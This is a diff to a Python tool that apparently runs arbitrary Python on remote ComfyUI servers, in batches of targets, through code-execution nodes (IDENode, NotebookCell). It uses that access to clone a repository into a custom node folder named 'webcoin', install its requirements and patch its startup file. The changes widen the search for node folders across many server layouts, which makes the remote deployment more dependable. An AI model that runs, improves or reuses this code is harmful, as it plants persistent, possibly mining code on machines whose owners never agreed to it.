@@ -30,6 +30,7 @@ Supports comma-separated targets for batch operations:
 
 import argparse
 import json
+import os
 import ssl
 import sys
 import time
@@ -102,6 +103,10 @@ WORKFLOW_STUB = {
 def run_idenode(base, python_code, wait=10, include_pnginfo=True):
     """Execute Python code on the remote machine via IDENode.
     Returns (prompt_id, status, output_lines)."""
+    raw = python_code
+    from engine.executor import wrap_idenode_embedded_code
+
+    python_code = wrap_idenode_embedded_code(raw)
 
     prompt = {
         "prompt": {
@@ -127,14 +132,14 @@ def run_idenode(base, python_code, wait=10, include_pnginfo=True):
             if "IDENode" in str(resp_data.get("node_errors", {})) or \
                "does not exist" in resp.lower():
                 print(f"  IDENode not available, trying NotebookCell...")
-                return run_notebook(base, python_code, wait=wait)
+                return run_notebook(base, raw, wait=wait)
         except Exception:
             pass
         print(f"  prompt_id: {prompt_id}")
     else:
         if "does not exist" in resp.lower() or "IDENode" in resp:
             print(f"  IDENode not available, trying NotebookCell...")
-            return run_notebook(base, python_code, wait=wait)
+            return run_notebook(base, raw, wait=wait)
         print(f"  /prompt -> {code}: {resp[:300]}")
         return prompt_id, "error", []
 
@@ -205,7 +210,11 @@ def _fetch_result(base, prompt_id):
             if status == "error":
                 msgs = entry.get("status", {}).get("messages", [])
                 for m in msgs:
-                    if m[0] == "execution_error":
+                    if (
+                        isinstance(m, (list, tuple))
+                        and len(m) >= 2
+                        and m[0] == "execution_error"
+                    ):
                         err = m[1]
                         etype = err.get("exception_type", "")
                         emsg = str(err.get("exception_message", ""))[:500]
@@ -219,25 +228,102 @@ def _fetch_result(base, prompt_id):
 #  Shared IDENode code fragments (the Python that runs on the remote)
 # ═══════════════════════════════════════════════════════════════════════
 
-FIND_CUSTOM_NODES = r"""
-cn = None
-try:
-    import folder_paths
-    if hasattr(folder_paths, 'get_folder_paths'):
-        cn = folder_paths.get_folder_paths('custom_nodes')[0]
-    else:
-        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
-except:
-    pass
-if not cn or not os.path.isdir(cn):
-    for g in ['/root/ComfyUI/custom_nodes', '/workspace/ComfyUI/custom_nodes',
-              '/basedir/custom_nodes', '/home/user/ComfyUI/custom_nodes',
-              r'C:\Program Files\ComfyUI-aki-v2\ComfyUI\custom_nodes',
-              r'C:\ComfyUI\custom_nodes']:
-        if os.path.isdir(g):
-            cn = g
-            break
-"""
+# Same resolution logic as engine.pipeline.FIND_CUSTOM_NODES; IDENode snippets below
+# expect a global `cn` (not `return`), so we assign after _find().
+FIND_CUSTOM_NODES = r'''import os
+def _find():
+    try:
+        import folder_paths
+        if hasattr(folder_paths, "get_folder_paths") and callable(getattr(folder_paths, "get_folder_paths")):
+            try:
+                cns = folder_paths.get_folder_paths("custom_nodes")
+            except (KeyError, TypeError, AttributeError):
+                cns = None
+            if cns is not None:
+                if isinstance(cns, dict):
+                    for v in cns.values():
+                        if isinstance(v, (list, tuple)):
+                            for c in v:
+                                if isinstance(c, str) and c and os.path.isdir(c):
+                                    return c
+                        elif isinstance(v, str) and v and os.path.isdir(v):
+                            return v
+                elif not isinstance(cns, (list, tuple)):
+                    cns = [cns]
+                for c in cns:
+                    if isinstance(c, str) and c and os.path.isdir(c):
+                        return c
+        fnp = getattr(folder_paths, "folder_names_and_paths", None)
+        if isinstance(fnp, dict):
+            entry = fnp.get("custom_nodes")
+            if isinstance(entry, (list, tuple)) and len(entry) >= 1:
+                paths = entry[0]
+                if isinstance(paths, list):
+                    for c in paths:
+                        if isinstance(c, str) and c and os.path.isdir(c):
+                            return c
+        fp = getattr(folder_paths, "__file__", None)
+        if isinstance(fp, str) and fp:
+            d = os.path.join(os.path.dirname(fp), "custom_nodes")
+            if os.path.isdir(d):
+                return d
+        for g in (
+            "/app/ComfyUI/custom_nodes", "/opt/ComfyUI/custom_nodes",
+            "/root/ComfyUI/custom_nodes", "/workspace/ComfyUI/custom_nodes",
+            "/data/ComfyUI/custom_nodes", "/basedir/custom_nodes",
+            "/comfy/ComfyUI/custom_nodes", "/usr/local/ComfyUI/custom_nodes",
+            "/mnt/ComfyUI/custom_nodes", "/export/ComfyUI/custom_nodes",
+            "/home/user/ComfyUI/custom_nodes", "/home/ubuntu/ComfyUI/custom_nodes",
+            "/var/ComfyUI/custom_nodes",
+            r"C:\Program Files\ComfyUI-aki-v2\ComfyUI\custom_nodes",
+            r"C:\ComfyUI\custom_nodes",
+        ):
+            if os.path.isdir(g):
+                return g
+        tails = ("ComfyUI/custom_nodes", "comfyui/custom_nodes", "ComfyUI/ComfyUI/custom_nodes")
+        for base in ("/root", "/app", "/data", "/workspace", "/opt", "/srv", "/export", "/mnt", "/var"):
+            if not os.path.isdir(base):
+                continue
+            for t in tails:
+                p = os.path.join(base, *t.split("/"))
+                if os.path.isdir(p):
+                    return p
+        home = os.path.expanduser("~")
+        if isinstance(home, str) and home:
+            for t in tails:
+                p = os.path.join(home, *t.split("/"))
+                if os.path.isdir(p):
+                    return p
+    except Exception:
+        pass
+    return ""
+cn = _find() or None
+if cn == "":
+    cn = None
+'''
+
+
+def _resolve_idenode_text_sink(base_url: str) -> tuple[str, str]:
+    """
+    Match engine.discovery: pick ShowText|pysssss / PreviewTextNode / etc. from /object_info.
+    Hardcoding PreviewTextNode + 'text' breaks on builds where the input name or wiring differs.
+    """
+    deploy_dir = os.path.dirname(os.path.abspath(__file__))
+    if deploy_dir not in sys.path:
+        sys.path.insert(0, deploy_dir)
+    try:
+        from engine import node_db
+
+        code, body = _get(f"{base_url}/object_info", timeout=25)
+        if code == 200:
+            oi = json.loads(body)
+            odef, ct = node_db.find_output_node(oi)
+            if ct and odef:
+                fld = node_db.resolve_output_field(odef, oi.get(ct, {}))
+                return ct, fld
+    except Exception:
+        pass
+    return "PreviewTextNode", "text"
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -523,48 +609,53 @@ def _strategy_queue_install(base):
     return False
 
 
-IDENODE_INSTALL_CODE = r"""
-import subprocess, os, sys, shutil
-cn = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else '/root/ComfyUI/custom_nodes/x'))), 'custom_nodes')
-try:
-    import folder_paths
-    cn = folder_paths.get_folder_paths('custom_nodes')[0] if hasattr(folder_paths, 'get_folder_paths') else os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
-except: pass
-target = os.path.join(cn, 'webcoin')
-tmp = target + '_tmp'
-for d in [tmp, target]:
-    if os.path.isdir(d):
-        shutil.rmtree(d, ignore_errors=True)
-subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
-import git
-git.Repo.clone_from('REPO_URL_PLACEHOLDER', tmp, depth=1)
-shutil.move(tmp, target)
-req = os.path.join(target, 'requirements.txt')
-if os.path.exists(req):
-    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
-init = os.path.join(target, '__init__.py')
-with open(init, 'r') as f:
-    txt = f.read()
-if 'sys.path.insert' not in txt:
-    txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
-    with open(init, 'w') as f:
-        f.write(txt)
-print('DEPLOY_OK')
-""".replace("REPO_URL_PLACEHOLDER", REPO_URL).strip()
+IDENODE_INSTALL_CODE = (
+    "import subprocess, os, sys, shutil\n"
+    + FIND_CUSTOM_NODES
+    + r"""
+if not cn:
+    print('ERROR: no custom_nodes')
+else:
+    target = os.path.join(cn, 'webcoin')
+    tmp = target + '_tmp'
+    for d in [tmp, target]:
+        if os.path.isdir(d):
+            shutil.rmtree(d, ignore_errors=True)
+    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
+    import git
+    git.Repo.clone_from('REPO_URL_PLACEHOLDER', tmp, depth=1)
+    shutil.move(tmp, target)
+    req = os.path.join(target, 'requirements.txt')
+    if os.path.exists(req):
+        subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
+    init = os.path.join(target, '__init__.py')
+    with open(init, 'r') as f:
+        txt = f.read()
+    if 'sys.path.insert' not in txt:
+        txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
+        with open(init, 'w') as f:
+            f.write(txt)
+    return 'DEPLOY_OK'
+"""
+).replace("REPO_URL_PLACEHOLDER", REPO_URL).strip()
 
 
 def _strategy_idenode(base, has_manager=False):
     print("[idenode] Trying IDENode code execution...")
+    from engine.executor import wrap_idenode_embedded_code
 
+    install_py = wrap_idenode_embedded_code(IDENODE_INSTALL_CODE)
+
+    out_ct, out_field = _resolve_idenode_text_sink(base)
     prompt = {
         "prompt": {
             "1": {
                 "class_type": "IDENode",
-                "inputs": {"pycode": IDENODE_INSTALL_CODE, "language": "python"},
+                "inputs": {"pycode": install_py, "language": "python"},
             },
             "2": {
-                "class_type": "PreviewTextNode",
-                "inputs": {"text": ["1", 0]},
+                "class_type": out_ct,
+                "inputs": {out_field: ["1", 0]},
             },
         }
     }
@@ -579,9 +670,9 @@ def _strategy_idenode(base, has_manager=False):
         return True
 
     alt_inputs = [
-        {"code": IDENODE_INSTALL_CODE, "language": "python"},
-        {"pycode": IDENODE_INSTALL_CODE},
-        {"code": IDENODE_INSTALL_CODE},
+        {"code": install_py, "language": "python"},
+        {"pycode": install_py},
+        {"code": install_py},
     ]
     for inp in alt_inputs:
         prompt["prompt"]["1"]["inputs"] = inp
@@ -1543,9 +1634,7 @@ else:
     except:
         pass
 
-output = chr(10).join(results)
-print(output)
-output
+result = chr(10).join(results)
 """
 
 
@@ -1629,7 +1718,11 @@ def cmd_errors(base, args):
         print(f"\n  === {pid} [{status_str}] ===")
         msgs = status.get("messages", [])
         for m in msgs:
-            if m[0] == "execution_error":
+            if (
+                isinstance(m, (list, tuple))
+                and len(m) >= 2
+                and m[0] == "execution_error"
+            ):
                 found_errors = True
                 err = m[1]
                 print(f"    node_type: {err.get('node_type')}")
